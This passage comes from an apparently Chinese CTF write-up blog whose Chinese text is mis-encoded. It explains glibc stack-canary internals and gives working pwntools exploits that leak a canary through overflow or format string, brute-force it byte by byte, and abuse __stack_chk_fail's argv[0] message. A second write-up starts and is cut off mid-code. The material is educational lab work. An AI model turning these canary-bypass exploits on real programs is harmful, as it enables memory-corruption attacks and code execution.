<span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>åœ¨æ²¡æœ‰å¼€å¯FULL RELROä¿æŠ¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒGOTè¡¨ï¼Œç„¶åè§¦å‘Canaryæ£€æµ‹æŠ¥é”™ï¼Œè¿™æ—¶å°±ä¼šè¿›å…¥åŠ«æŒçš„åœ°å€ã€‚å¦ä¸€ç§æ˜¯åˆ©ç”¨fortify_failå‡½æ•°æ‰“å°å…³é”®ä¿¡æ¯</strong><br><strong>å…³äºCanaryçš„å‚¨å­˜åœ°å€ï¼Œå¯¹äºLiunxæ¥è¯´ï¼Œfså¯„å­˜å™¨å®é™…æŒ‡å‘çš„æ˜¯å½“å‰è¿›ç¨‹çš„TLSç»“æ„ï¼Œfsï¼š0x28æŒ‡å‘çš„æ­£å¼stack_guardã€‚å¦‚æœæº¢å‡ºæ¡ä»¶åˆé€‚ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è¦†ç›–TLSä¸­ä¿å­˜çš„Canaryå€¼</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure><p><strong>è¿™ä¸ªå€¼ç”±ssecurity_initå‡½æ•°æ¥åˆå§‹åŒ–</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_randomçš„å€¼åœ¨è¿›å…¥è¿™ä¸ªå‡½æ•°çš„æ—¶å€™å°±å·²ç»ç”±kernelå†™å…¥.</span><br>  <span class="hljs-comment">// glibcç›´æ¥ä½¿ç”¨äº†_dl_randomçš„å€¼å¹¶æ²¡æœ‰ç»™èµ‹å€¼</span><br>  <span class="hljs-comment">// å¦‚æœä¸é‡‡ç”¨è¿™ç§æ¨¡å¼, glibcä¹Ÿå¯ä»¥è‡ªå·±äº§ç”Ÿéšæœºæ•°</span><br><br>  <span class="hljs-comment">//å°†_dl_randomçš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// è®¾ç½®Canaryçš„å€¼åˆ°TLSä¸­</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARDå®ç”¨äºè®¾ç½®TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure><p><strong>Canaryçš„æœ€åä¸€ä¸ªå­—èŠ‚å‘—è®¾ç½®ä¸º0ï¼Œé˜²æ­¢ç±»ä¼¼ä¸printf(â€œ%sâ€ , &amp;buf)ï¼Œå½¢å¼çš„å‡½æ•°ä¸å°å¿ƒæ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ª0ç»™è¦†ç›–ï¼Œç”¨æ‰“å°å‡½æ•°æ¥è¦†ç›–ï¼Œè¿™æ ·å°±æ³„éœ²äº†Canaryçš„å€¼</strong></p><h1 id="Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“"><a href="#Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“" class="headerlink" title="Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“"></a>Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“</h1><ol><li><strong>_dl_randomç”±Kernelå†™å…¥</strong></li><li><strong>security_init å‡½æ•°å°†_dl_random çš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0ï¼Œé˜²æ­¢ printf(â€œ%sâ€)è¿™ç±»æ‰“å°å‡½æ•°ä¸å°å¿ƒæ³„éœ² Canaryã€‚</strong></li><li><strong>security_init å‡½æ•°å°† Canary å€¼è®¾ç½®åˆ° TLS ä¸­ã€‚</strong></li><li><strong>åœ¨å‡½æ•°å¼€å§‹æ—¶ï¼Œä¼šå–å‡ºTLSä¸­çš„Canaryå€¼æ”¾åœ¨ebp-4h(64ä½ç³»ç»Ÿä¸ºrbp-8h)<br>ä¸­ï¼Œå³é˜²æ­¢é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹ ebp å’Œè¿”å›åœ°å€ã€‚</strong></li><li><strong>åœ¨å‡½æ•°ç»“æŸæ—¶ï¼Œä¼šå–å‡ºebp-4h(64ä½ç³»ç»Ÿä¸ºrbp-8h)çš„å€¼ï¼Œå¹¶ä¸ TLS ä¸­çš„ Canarå€¼è¿›è¡Œå¼‚æˆ–ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º0ã€‚è‹¥ç»“æœä¸º0ï¼Œåˆ™æ£€æŸ¥é€šè¿‡;è‹¥ç»“æœä¸ä¸º0ï¼Œåˆ™æ£€æŸ¥ä¸é€šè¿‡ï¼Œè¿›äººstack_chk_fail å‡½æ•°</strong></li></ol><h2 id="Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´"><a href="#Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´" class="headerlink" title="Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´"></a>Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´</h2><ul><li><strong>stack_chk_fai1å‡½æ•°ä¼šæœ‰ä¿¡æ¯è¾“å‡ºï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ libc_argv[0]ï¼Œå°±èƒ½å¤Ÿé€šè¿‡stack_chk failå‡½æ•°æ³„éœ²å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œè¿™ä¸ªæŠ€æœ¯è¢«ç§°ä¸º stacksmashes(glibc 2.27 å’Œ 2.27ä¹‹åçš„ç‰ˆæœ¬ä¼šæœ‰ä¸€äº›å˜åŒ–)ã€‚</strong></li><li>å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå¾ˆé•¿çš„æ ˆæº¢å‡ºï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥æº¢å‡ºTLS ä¸­çš„ a1_random çš„å€¼ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡ Canary ä¿æŠ¤ã€‚å½“ç„¶ï¼Œè¿™é‡Œå¯èƒ½è¿˜éœ€è¦ä¸€ä¸ªå¤šçº¿ç¨‹çš„æ¡ä»¶ï¼Œå¯ä»¥åœ¨åç»­ä¾‹<br>é¢˜ä¸­çœ‹åˆ°ã€‚</li></ul><h2 id="å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š"><a href="#å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š" class="headerlink" title="å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š"></a>å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š</h2><ol><li><strong>åˆ©ç”¨æ³„éœ²å‡½æ•°æ³„éœ²å‡º Canary çš„å€¼ï¼Œå†è¿›è¡Œåˆ©ç”¨ã€‚</strong></li><li><strong>çˆ†ç ´å¾—åˆ° Canary çš„å€¼ã€‚</strong></li><li><strong>stack_chk fai1 å‡½æ•°æ³„éœ²å…³é”®ä¿¡æ¯ã€‚</strong></li><li><strong>ä¿®æ”¹ TLS ä¸­çš„ stack quard å€¼ã€‚</strong></li></ol><h1 id="æ³„éœ²Canaryå€¼"><a href="#æ³„éœ²Canaryå€¼" class="headerlink" title="æ³„éœ²Canaryå€¼"></a>æ³„éœ²Canaryå€¼</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/leak_canary">é™„ä»¶ä¸‹è½½</a></strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347433.png"><br><strong>æ³¨æ„ç‚¹Canaryå€¼è·ç¦»ebpä¸º0xcï¼Œç„¶åé€šè¿‡æ ˆæº¢å‡ºè¦†ç›–æœ€åä¸€ä½0ï¼Œé€šè¿‡æ‰“å°å‡½æ•°æ‰“å°å‡ºæ¥cancary</strong></p><ol><li><strong>ç¬¬ä¸€ç§æ˜¯ç”¨æ ˆæº¢å‡ºæ¼æ´</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>canary_addr = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>payload2 += p32(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>payload2 += p32(target)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure></li><li>ç¬¬äºŒç§æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>p1 = <span class="hljs-string">&#x27;%&#123;offset&#125;$p\n&#x27;</span>.<span class="hljs-built_in">format</span>(offset = <span class="hljs-number">71</span>)<br><br>p.send(p1)<br>canary_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span> , drop=<span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br><br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>p2 += <span class="hljs-number">0xc</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p2 += p32(target)<br><br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure></li></ol><h1 id="é€å­—èŠ‚çˆ†ç ´Canary"><a href="#é€å­—èŠ‚çˆ†ç ´Canary" class="headerlink" title="é€å­—èŠ‚çˆ†ç ´Canary"></a>é€å­—èŠ‚çˆ†ç ´Canary</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/one_by_one_bruteforce">é™„ä»¶ä¸‹è½½</a></strong><br><strong>è¿™ç§æ–¹æ³•å±€é™æ€§æ¯”è¾ƒå¤§ï¼Œå¿…é¡»æœ‰forkå‡½æ•°å¼€å¯å­è¿›ç¨‹ã€‚å› ä¸ºforkå‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹å†…å­˜ï¼Œæ‰€ä»¥åˆ›å»ºçš„å­è¿›ç¨‹canaryéƒ½æ˜¯ç›¸åŒçš„</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347688.png"><br><strong>æˆ‘ä»¬ä¸€ç›´forkå¼€å¯å­è¿›ç¨‹ï¼Œä¸€ä¸ªä¸€ä¸ªå­—èŠ‚çš„çˆ†ç ´</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./one_by_one_bruteforce&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce1bit</span>() :<br>  <span class="hljs-keyword">global</span> known<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    p1 = <span class="hljs-number">0x108</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>    p1 += known<br>    p1 += <span class="hljs-built_in">bytes</span>([i])<br>    p.sendafter(<span class="hljs-string">&#x27;one_by_one_bruteforce\n&#x27;</span>,p1)<br>    <span class="hljs-keyword">try</span> :<br>      info = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;*** stack smashing detected ***&quot;</span> <span class="hljs-keyword">in</span> info :<br>        p.send(<span class="hljs-string">&#x27;n\n&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">else</span> :<br>        known += <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        log.info(<span class="hljs-string">&#x27;wrong&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>      <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce_canary</span>():<br>  <span class="hljs-keyword">global</span> known<br>  known += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    bruteforce1bit()<br>    <span class="hljs-keyword">if</span> i != <span class="hljs-number">6</span> :<br>      p.send(<span class="hljs-string">b&#x27;n\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span> :<br>      p.send(<span class="hljs-string">b&#x27;y\n&#x27;</span>)<br><br>target = <span class="hljs-number">0x000000000040083E</span><br>known = <span class="hljs-string">b&quot;&quot;</span><br>bruteforce_canary()<br>canary = u64(known)  <span class="hljs-comment"># Ensure known is 8 bytes</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(target)<br>p.sendafter(<span class="hljs-string">b&quot;go\n&quot;</span>, p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>| è¿™ä¸¤ä¸ªç†è§£èµ·æ¥éƒ½å¾ˆç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆéš¾ç‚¹ï¼Œçœ‹ç€expå¾ˆå®¹æ˜“ç†è§£</p><h1 id="stack-smashes"><a href="#stack-smashes" class="headerlink" title="stack_smashes"></a>stack_smashes</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/stack_smashes">é™„ä»¶ä¸‹è½½</a></strong></p><p><strong>å‰è¾¹å·²ç»ç®€ç»äº†ï¼Œ_stack_chk_failå‡½æ•°ä¼šå°†__libc_agrc[0]çš„ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”¹å˜__libc_agrc[0]çš„åœ°å€ä¸ºæˆ‘ä»¬æƒ³è¦ä¿¡æ¯çš„å€¼ï¼Œé‚£ä¹ˆå°±èƒ½å¾—åˆ°ç›¸åº”æ•°æ®äº†</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347802.png"><br><strong>é¦–å…ˆç®€ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯__libc_agrc[0]</strong></p><p><strong>main(int argc , char ,*argv[ ])</strong></p><ol><li><strong>argcä¸ºæ•´æ•°</strong></li><li><strong>argvä¸ºæŒ‡é’ˆçš„æŒ‡é’ˆï¼ˆå¯ç†è§£ä¸ºï¼šchar **argv or: char *argv[] or: char argv[][] ï¼Œargvæ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„)</strong><br><strong>æ³¨ï¼šmain()æ‹¬å·å†…æ˜¯å›ºå®šçš„å†™æ³•ã€‚</strong></li><li><strong>ä¸‹é¢ç»™å‡ºä¸€ä¸ªä¾‹å­æ¥ç†è§£è¿™ä¸¤ä¸ªå‚æ•°çš„ç”¨æ³•ï¼š</strong><br>**ã€€å‡è®¾ç¨‹åºçš„åç§°ä¸ºprogï¼Œ**<br><strong>å½“åªè¾“å…¥progï¼Œåˆ™ç”±æ“ä½œç³»ç»Ÿä¼ æ¥çš„å‚æ•°ä¸ºï¼š</strong><br><strong>argc&#x3D;1,è¡¨ç¤ºåªæœ‰ä¸€ç¨‹åºåç§°ã€‚</strong><br><strong>argcåªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œargv[0]æŒ‡å‘è¾“å…¥çš„ç¨‹åºè·¯å¾„åŠåç§°ï¼š.&#x2F;prog</strong><br><strong>å½“è¾“å…¥prog para_1ï¼Œæœ‰ä¸€ä¸ªå‚æ•°ï¼Œåˆ™ç”±æ“ä½œç³»ç»Ÿä¼ æ¥çš„å‚æ•°ä¸ºï¼š</strong><br><strong>argc&#x3D;2ï¼Œè¡¨ç¤ºé™¤äº†ç¨‹åºåå¤–è¿˜æœ‰ä¸€ä¸ªå‚æ•°ã€‚</strong><br><strong>argv[0]æŒ‡å‘è¾“å…¥çš„ç¨‹åºè·¯å¾„åŠåç§°ã€‚</strong><br><strong>argv[1]æŒ‡å‘å‚æ•°para_1å­—ç¬¦ä¸²ã€‚</strong><br><strong>å½“è¾“å…¥prog para_1 para_2 æœ‰2ä¸ªå‚æ•°ï¼Œåˆ™ç”±æ“ä½œç³»ç»Ÿä¼ æ¥çš„å‚æ•°ä¸ºï¼š</strong><br><strong>argc&#x3D;3ï¼Œè¡¨ç¤ºé™¤äº†ç¨‹åºåå¤–è¿˜æœ‰2ä¸ªå‚æ•°ã€‚</strong><br><strong>argv[0]æŒ‡å‘è¾“å…¥çš„ç¨‹åºè·¯å¾„åŠåç§°ã€‚</strong><br><strong>argv[1]æŒ‡å‘å‚æ•°para_1å­—ç¬¦ä¸²ã€‚</strong><br><strong>argv[2]æŒ‡å‘å‚æ•°para_2å­—ç¬¦ä¸²ã€‚</strong></li><li><strong>void main( int argc, char *argv[] )</strong><br><strong>char *argv[] : argv æ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œä»–çš„å…ƒç´ ä¸ªæ•°æ˜¯argcï¼Œå­˜æ”¾çš„æ˜¯æŒ‡å‘æ¯ä¸€ä¸ªå‚æ•°çš„æŒ‡é’ˆ</strong></li></ol><p><strong>æˆ‘ä»¬æœ¬é¢˜éœ€è¦æ‰¾__libc_agrc[0]å’Œè¾“å…¥çš„åç§»</strong><br><strong>ä¸‹æ–­ç‚¹ç›´æ¥åˆ°è¾“å…¥å‡½æ•°</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347411.png"><br><strong>ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¾“å…¥åœ°å€ï¼ˆå…·ä½“ç¬¬å‡ ä¸ªå‚æ•°ï¼Œæ ¹æ®å‡½æ•°æœ¬èº«å†³å®šï¼‰</strong><br><strong>ä¸‹æ–­ç‚¹åˆ°main</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347668.png"><br><strong>__libc_argv[0]æŒ‡å‘çš„æ˜¯æ–‡ä»¶è·¯å¾„</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348166.png"><br><strong>ç›´æ¥ç®—å‡ºåç§»</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è„šæœ¬ä¹Ÿæ˜¯éå¸¸easy</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./stack_smashes&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x000000000040087A&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>flag_addr = <span class="hljs-number">0x0000000000601090</span><br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x218</span> + p64(flag_addr)<br>p.sendafter(<span class="hljs-string">&quot;stack_smashes\n&quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="/2024/07/18/not-the-same-3dsctf-2016/"/>
    <url>/2024/07/18/not-the-same-3dsctf-2016/</url>
    
    <content type="html"><![CDATA[<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><strong>æŸ¥çœ‹ä¿æŠ¤å°±ä¸è¯´äº†</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182331100.png"></p><p><strong>IDAåç¼–è¯‘å‘ç°ä¸ºé™æ€ç¼–è¯‘ï¼Œä¸ç”¨æ‰¾libcäº†è¿™ç‚¹èŠ‚çœä¸å°‘åŠŸå¤«ã€‚æ‰“å¼€mainå‡½æ•°ï¼Œå‘ç°æ ˆæº¢å‡ºæ¼æ´</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332667.png"><br><strong>åç§»ä¸º45ï¼Œè¿™ä¸ªæ˜¯æ ¹æ®gdbçš„cyclicç®—å‡ºæ¥çš„</strong><br><strong>å‘ç°åé—¨å‡½æ•°get_secretï¼ŒåŠŸèƒ½æ˜¯æŠŠflagè¯»å–èµ‹å€¼ç»™fl4g</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332184.png"><br><strong>åˆæ­¥æ€è·¯ä¸ºé€šè¿‡æ ˆæº¢å‡ºï¼Œè°ƒç”¨get_secretï¼Œå†é€šè¿‡writeå‡½æ•°è¯»å–fl4g</strong></p><h2 id="æ–¹æ³•ä¸€-é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°"><a href="#æ–¹æ³•ä¸€-é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°" class="headerlink" title="æ–¹æ³•ä¸€ é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°"></a>æ–¹æ³•ä¸€ é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨åé—¨å‡½æ•°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 